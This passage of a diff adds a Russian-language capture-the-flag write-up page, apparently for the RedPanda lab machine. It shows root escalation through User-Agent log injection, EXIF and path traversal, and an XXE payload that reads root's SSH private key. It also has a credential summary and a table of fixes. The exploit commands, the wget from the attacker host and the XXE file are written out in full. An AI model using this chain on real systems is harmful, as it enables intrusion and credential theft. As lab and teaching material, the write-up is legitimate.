+    <span class="kw">if</span> (!<span class="fn">isImage</span>(line)) <span class="kw">continue</span>;
+    String artist  = <span class="fn">getArtist</span>(parsed.<span class="fn">get</span>(<span class="st">"uri"</span>));
+    String xmlPath = <span class="st">"/credits/"</span> + <span class="rd">artist</span> + <span class="st">"_creds.xml"</span>;
+    <span class="fn">addViewTo</span>(xmlPath, parsed.<span class="fn">get</span>(<span class="st">"uri"</span>));
+}</pre>
+    </div>
+
+    <p>Идея простая: процесс работает от root, собирает пути к файлам из данных, которые контролируем мы, а потом разбирает XML-файл, который — благодаря этим путям — тоже наш. Каждый вход в этой цепочке под нашим контролем. По шагам:</p>
+
+    <table class="vuln-table">
+      <thead><tr><th>Шаг</th><th>Что делает root</th><th>Что контролируем мы</th></tr></thead>
+      <tbody>
+        <tr><td>1. Строка лога</td><td>режет по <code>||</code>, берёт <code>[3]</code> как URI</td><td>User-Agent — вставляем свой <code>||</code> и сдвигаем поля</td></tr>
+        <tr><td>2. Путь к картинке</td><td><code>static + uri</code></td><td><code>/../../../../home/woodenk/root.jpg</code> — traversal к нашему JPG</td></tr>
+        <tr><td>3. Путь к XML</td><td><code>/credits/ + Artist + _creds.xml</code></td><td>EXIF-тег Artist — второй traversal к нашему XML</td></tr>
+        <tr><td>4. Разбор XML</td><td><code>SAXBuilder</code> с дефолтами</td><td>DOCTYPE с внешней сущностью → XXE</td></tr>
+        <tr><td>5. Запись</td><td>сохраняет разобранный документ</td><td>раскрытая сущность попадает в файл, который мы можем прочитать</td></tr>
+      </tbody>
+    </table>
+
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">поток данных — от одного User-Agent до ключа root</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>curl -A <span class="st">'||/../../home/woodenk/root.jpg'</span>
+   │
+   ▼
+/opt/panda_search/redpanda.log        <span class="cm">// строку пишет за нас веб-приложение</span>
+   │  split("||")[3]
+   ▼
+uri = /../../home/woodenk/root.jpg    <span class="cm">// traversal #1</span>
+   │  getArtist()
+   ▼
+EXIF Artist = ../home/woodenk/root    <span class="cm">// traversal #2</span>
+   │  "/credits/" + artist + "_creds.xml"
+   ▼
+/home/woodenk/root_creds.xml          <span class="cm">// наш XML, разбирает root</span>
+   │  SAXBuilder → &amp;example;
+   ▼
+<span class="rd">file:///root/.ssh/id_rsa</span>              <span class="cm">// XXE</span>
+   │  xmlOutput.output()
+   ▼
+/home/woodenk/root_creds.xml          <span class="cm">// ключ записан обратно — читаем</span></pre>
+    </div>
+
+    <div class="callout">Это не классический LFI — мы ничего не инклюдим. Это <strong>два path traversal</strong>, которые направляют файловые операции root на файлы, написанные нами, а затем <strong>XXE</strong>, который превращает «разбери этот XML» в «прочитай любой файл на машине». А раз программа после подсчёта просмотров сохраняет документ на диск, результат она отдаёт нам сама — в файле в нашем же домашнем каталоге.</div>
+  </div>
+
+  <!-- SECTION 7 -->
+  <div class="section">
+    <div class="section-num">07 — Эксплуатация</div>
+    <h2>Инъекция в лог → Traversal → XXE → id_rsa</h2>
+
+    <h3 class="sub">1. JPG — traversal в теге Artist</h3>
+    <p>Подойдёт любой JPG. Пиксели не важны, важны только метаданные:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — атакующий</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>exiftool -Artist=<span class="st">'../home/woodenk/root'</span> root.jpg
+exiftool root.jpg | grep Artist
+<span class="cm"># Artist : ../home/woodenk/root</span></pre>
+    </div>
+    <p>Почему бы просто не положить свой XML в <code>/credits/</code>? Потому что не можем — каталог принадлежит root и <code>woodenk</code> писать туда не может. Программа всегда открывает только <code>/credits/&lt;artist&gt;_creds.xml</code>, но artist выбираем мы. Поэтому тег Artist уводит путь из <code>/credits</code> в каталог, который наш:</p>
+    <p><code>/credits/</code> + <code>../home/woodenk/root</code> + <code>_creds.xml</code> = <code>/home/woodenk/root_creds.xml</code>. Root пойдёт искать XML в нашем домашнем каталоге.</p>
+
+    <h3 class="sub">2. XML — внешняя сущность</h3>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">xml — root_creds.xml</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>&lt;?xml version=<span class="st">"1.0"</span> encoding=<span class="st">"UTF-8"</span>?&gt;
+<span class="rd">&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM "file:///root/.ssh/id_rsa"&gt;]&gt;</span>
+&lt;credits&gt;
+  &lt;author&gt;damian&lt;/author&gt;
+  &lt;image&gt;
+    &lt;uri&gt;/../../../../../../home/woodenk/root.jpg&lt;/uri&gt;
+    &lt;uwu&gt;<span class="rd">&amp;example;</span>&lt;/uwu&gt;
+    &lt;views&gt;0&lt;/views&gt;
+  &lt;/image&gt;
+  &lt;totalviews&gt;0&lt;/totalviews&gt;
+&lt;/credits&gt;</pre>
+    </div>
+    <p>Структура повторяет настоящие credits-файлы — <code>&lt;uri&gt;</code> должен совпасть точно, чтобы отработала логика счётчика и файл записался обратно. Лишний элемент <code>&lt;uwu&gt;</code> — место, где появится приватный ключ root.</p>
+
+    <h3 class="sub">3. Закидываем оба файла на машину</h3>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — reverse shell</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>woodenk@redpanda:~$ wget 10.10.15.118:8000/root.jpg
+woodenk@redpanda:~$ wget 10.10.15.118:8000/root_creds.xml</pre>
+    </div>
+
+    <h3 class="sub">4. Отравляем лог через User-Agent</h3>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>curl -s -o /dev/null http://10.129.99.184:8080/stats \
+     -A <span class="st">'||/../../../../../../home/woodenk/root.jpg'</span></pre>
+    </div>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — redpanda.log</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>woodenk@redpanda:~$ cat /opt/panda_search/redpanda.log
+200||10.129.99.184||<span class="cm">&lt;пустой UA&gt;</span>||<span class="rd">/../../../../../../home/woodenk/root.jpg</span>||/stats</pre>
+    </div>
+    <p>Наш <code>||</code> сдвинул настоящий URI в слот 4, а в слоте 3 теперь наш путь. В строке есть <code>.jpg</code>, так что <code>isImage()</code> пропускает её без вопросов.</p>
+
+    <h3 class="sub">5. Ждём cron</h3>
+    <p>Задача запускается каждые две минуты. Потом:</p>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>woodenk@redpanda:~$ cat root_creds.xml
+&lt;?xml version=<span class="st">"1.0"</span> encoding=<span class="st">"UTF-8"</span>?&gt;
+&lt;!DOCTYPE foo&gt;
+&lt;credits&gt;
+  &lt;author&gt;damian&lt;/author&gt;
+  &lt;image&gt;
+    &lt;uri&gt;/../../../../../../home/woodenk/root.jpg&lt;/uri&gt;
+    &lt;uwu&gt;<span class="st">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+...
+-----END OPENSSH PRIVATE KEY-----</span>&lt;/uwu&gt;
+    &lt;views&gt;<span class="nu">1</span>&lt;/views&gt;
+  &lt;/image&gt;
+  &lt;totalviews&gt;<span class="nu">1</span>&lt;/totalviews&gt;
+&lt;/credits&gt;</pre>
+    </div>
+    <p>Один просмотр засчитан, один приватный ключ доставлен. Root был так любезен, что обновил статистику панд, пока отдавал его нам.</p>
+
+    <h3 class="sub">6. SSH от root</h3>
+    <div class="code-block">
+      <div class="code-label">
+        <span class="code-lang">bash — атакующий</span>
+        <button class="copy-btn" onclick="copyCode(this)">copy</button>
+      </div>
+      <pre>❯ chmod 600 root_key
+❯ ssh -i root_key root@10.129.99.184
+root@redpanda:~# cat /root/root.txt
+<span class="st">db02d0a8************************</span></pre>
+    </div>
+    <p>Root. Четыре сломанных допущения в одной cron-задаче.</p>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- CREDS SUMMARY -->
+  <div class="section">
+    <div class="section-num">Итог</div>
+    <h2>Учётные данные</h2>
+    <table class="creds-table">
+      <thead><tr><th>Пользователь</th><th>Пароль / Метод</th><th>Источник</th></tr></thead>
+      <tbody>
+        <tr><td>woodenk (shell)</td><td>SSTI → Runtime.exec()</td><td>/search, SpEL *{...}</td></tr>
+        <tr><td>woodenk (SSH)</td><td>RedPanda*****</td><td>MainController.java</td></tr>
+        <tr><td>root</td><td>id_rsa</td><td>LogParser traversal + XXE</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <!-- FAILURE ANALYSIS -->
+  <div class="section">
+    <div class="section-num">// разбор ошибок</div>
+    <h2>Что сломалось и почему</h2>
+    <table class="vuln-table">
+      <thead>
+        <tr><th>Вектор</th><th>Причина</th><th>Исправление</th></tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>SSTI в /search</td>
+          <td>Ввод пользователя вклеивается в шаблон Thymeleaf; «починили» чёрным списком <code>$ _ ~</code>, а <code>*{}</code> и <code>#{}</code> остались открыты</td>
+          <td>Передавать ввод как атрибут модели, а не как исходник шаблона; чёрный список убрать</td>
+        </tr>
+        <tr>
+          <td>Захардкоженные креды БД</td>
+          <td>Пароль открытым текстом в исходнике, переиспользован для системной учётки</td>
+          <td>Секреты вынести из кода; разные креды для БД и ОС</td>
+        </tr>
+        <tr>
+          <td>Инъекция полей лога</td>
+          <td>Формат лога использует <code>||</code> как разделитель, но User-Agent не экранируется</td>
+          <td>Структурированные логи (JSON) или экранирование разделителя при записи</td>
+        </tr>
+        <tr>
+          <td>Path traversal ×2</td>
+          <td>URI из логов и тег EXIF Artist склеиваются в пути к файлам и читаются от root</td>
+          <td>Канонизировать путь и проверять, что он не выходит за базовый каталог; allowlist имён авторов</td>
+        </tr>
+        <tr>
+          <td>XXE</td>
+          <td><code>SAXBuilder</code> с дефолтными настройками раскрывает внешние сущности</td>
+          <td>Запретить DOCTYPE (<code>disallow-doctype-decl</code>) / <code>setExpandEntities(false)</code></td>
+        </tr>
+        <tr>
+          <td>Cron от root</td>
+          <td>Обработка логов, которой root не нужен, запускается от root</td>
+          <td>Запускать от отдельного непривилегированного пользователя</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <footer>
+    <span class="footer-brand">cybermaksx.com</span>
+    <div class="footer-links">
+      <a href="https://github.com/cybermaksx" target="_blank">GitHub</a>
+      <a href="https://linkedin.com" target="_blank">LinkedIn</a>
+    </div>
+  </footer>
+
+</div>
+
+<script>
+  /* ---- heart for Codistry ---- */
+  (function () {
+    const overlay = document.getElementById('heart-overlay');
+    const canvas  = document.getElementById('heart-canvas');
+    const ctx     = canvas.getContext('2d');
+    const replay  = document.getElementById('heart-replay');
+    const reduce  = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+    let particles = [], raf = null, start = 0, W = 0, H = 0;
+
+    function heartPoint(t) {               // classic parametric heart
+      return {
+        x: 16 * Math.pow(Math.sin(t), 3),
+        y: -(13 * Math.cos(t) - 5 * Math.cos(2 * t) - 2 * Math.cos(3 * t) - Math.cos(4 * t))
+      };
+    }
+
+    function resize() {
+      const dpr = window.devicePixelRatio || 1;
+      const r = canvas.getBoundingClientRect();
+      W = r.width; H = r.height;
+      canvas.width = W * dpr; canvas.height = H * dpr;
+      ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+    }
+
+    function build() {
+      particles = [];
+      const scale = Math.min(W, H) / 38;
+      const N = 420;
+      for (let i = 0; i < N; i++) {
+        const t = (i / N) * Math.PI * 2;
+        const p = heartPoint(t);
+        const k = 0.55 + Math.random() * 0.45;  // fill inside the heart too
+        particles.push({
+          tx: W / 2 + p.x * scale * (i % 3 === 0 ? k : 1),
+          ty: H / 2 + p.y * scale * (i % 3 === 0 ? k : 1) - 6,
+          x: Math.random() * W, y: H + Math.random() * 120,
+          r: 1 + Math.random() * 2.2,
+          hue: 335 + Math.random() * 25,
+          d: Math.random() * 0.6
+        });
+      }
+    }
+
+    function frame(now) {
+      if (!start) start = now;
+      const el = (now - start) / 1000;
+      ctx.clearRect(0, 0, W, H);
+      const beat = 1 + 0.05 * Math.pow(Math.sin(el * 3.2), 8);   // heartbeat pulse
+      for (const p of particles) {
+        const prog = Math.min(1, Math.max(0, (el - p.d) / 1.6));
+        const e = 1 - Math.pow(1 - prog, 3);
+        const cx = W / 2, cy = H / 2;
+        const tx = cx + (p.tx - cx) * beat, ty = cy + (p.ty - cy) * beat;
+        const x = p.x + (tx - p.x) * e, y = p.y + (ty - p.y) * e;
+        ctx.beginPath();
+        ctx.fillStyle = `hsla(${p.hue}, 95%, ${60 + 10 * Math.sin(el * 2 + p.hue)}%, ${0.35 + 0.65 * e})`;
+        ctx.shadowColor = 'rgba(255,69,109,0.8)';
+        ctx.shadowBlur = 8;
+        ctx.arc(x, y, p.r, 0, Math.PI * 2);
+        ctx.fill();
+      }
+      if (el > 1.4) overlay.classList.add('show-text');
+      raf = requestAnimationFrame(frame);
+    }
+
+    function show() {
+      overlay.classList.remove('hide', 'show-text');
+      resize(); build(); start = 0;
+      cancelAnimationFrame(raf);
+      if (reduce) {                       // no animation: draw final state once
+        particles.forEach(p => { p.x = p.tx; p.y = p.ty; p.d = 0; });
+        overlay.classList.add('show-text');
+      }
+      raf = requestAnimationFrame(frame);
+    }
+
+    function hide() {
+      overlay.classList.add('hide');
+      setTimeout(() => cancelAnimationFrame(raf), 900);
+    }
+
+    overlay.addEventListener('click', hide);
+    document.addEventListener('keydown', e => { if (e.key === 'Escape') hide(); });
+    replay.addEventListener('click', show);
+    window.addEventListener('resize', () => { if (!overlay.classList.contains('hide')) { resize(); build(); } });
+    show();
+  })();
+</script>
+<script>
+  function copyCode(btn) {
+    const pre = btn.closest('.code-block').querySelector('pre');
+    navigator.clipboard.writeText(pre.innerText).then(() => {
+      btn.textContent = 'copied';
+      setTimeout(() => btn.textContent = 'copy', 1500);
+    });
+  }
+</script>
+
+</body>
+</html>
